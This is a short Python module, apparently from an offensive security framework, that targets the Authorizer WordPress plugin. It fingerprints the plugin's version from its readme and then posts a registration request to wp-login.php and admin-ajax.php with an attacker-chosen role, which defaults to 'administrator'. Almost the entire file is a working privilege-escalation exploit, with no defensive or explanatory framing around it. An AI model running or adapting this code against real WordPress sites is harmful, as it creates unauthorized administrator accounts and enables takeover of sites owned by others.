#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Authorizer WordPress plugin helpers."""

from __future__ import annotations

import re
from typing import Optional, Tuple

from core.framework.base_module import BaseModule


class Wp_authorizer(BaseModule):
    """Open registration with attacker-supplied role."""

    def authorizer_detected(self) -> Tuple[bool, str]:
        for path in ("/", "/wp-content/plugins/authorizer/readme.txt"):
            resp = self.http_request("GET", path, timeout=12)
            if resp and "authorizer" in (resp.text or "").lower():
                version = ""
                if "readme" in path:
                    match = re.search(r"Stable tag:\s*([\w.\-]+)", resp.text or "", re.I)
                    if match:
                        version = match.group(1)
                return True, version
        return False, ""

    def authorizer_register(
        self,
        username: str,
        password: str,
        role: str = "administrator",
    ) -> Optional[dict]:
        data = {
            "action": "register",
            "user_login": username,
            "user_email": f"{username}@example.com",
            "user_pass": password,
            "role": role,
        }
        for ep in ("/wp-login.php?action=register", "/wp-admin/admin-ajax.php"):
            resp = self.http_request("POST", ep, data=data, timeout=20)
            if not resp:
                continue
            code = int(resp.status_code or 0)
            if code in (200, 302):
                return {"endpoint": ep, "status_code": code, "role": role}
        return None